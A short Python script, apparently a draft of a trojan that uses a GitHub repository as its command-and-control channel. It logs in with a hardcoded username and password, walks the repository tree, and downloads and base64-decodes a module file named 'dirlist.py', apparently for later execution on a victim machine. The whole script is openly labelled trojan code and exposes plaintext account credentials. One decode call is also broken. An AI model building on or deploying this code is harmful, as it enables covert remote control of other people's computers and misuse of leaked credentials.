#https://github3py.readthedocs.io/en/master/index.html
import json
import base64
import sys
import time
import imp
import random
import threading
import queue
import os
from github3 import login

trojan_id = "abc"
trojan_config = trojan_id + ".json"
data_path = "data/" + trojan_id + "/"
trojan_modules = []
configured = False
task_queue = queue.Queue()

def connect_to_github():
    gh = login(username = "16BitBot", password = "Git1902!")
    repo = gh.repository("16BitBot", "repository_1")
    branch = repo.branch("master")
    return gh, repo, branch

def get_file_contents():
    gh, repo, branch = connect_to_github()
    #A Git commit is a snapshot of the hierarchy (Git tree) and the contents of
    #the files (Git blob) in a Git repository.
    tree = branch.commit.commit.tree.to_tree().recurse()
    for filename in tree.tree:
        if "dirlist.py" in filename.path:
            print(base64.b64decode(filename))
            #A Git blob (binary large object) is the object type used to store
            #the contents of each file in a repository.
            blob = repo.blob(filename._json_data["sha"])
            print(base64.b64decode(blob.content))

get_file_contents()
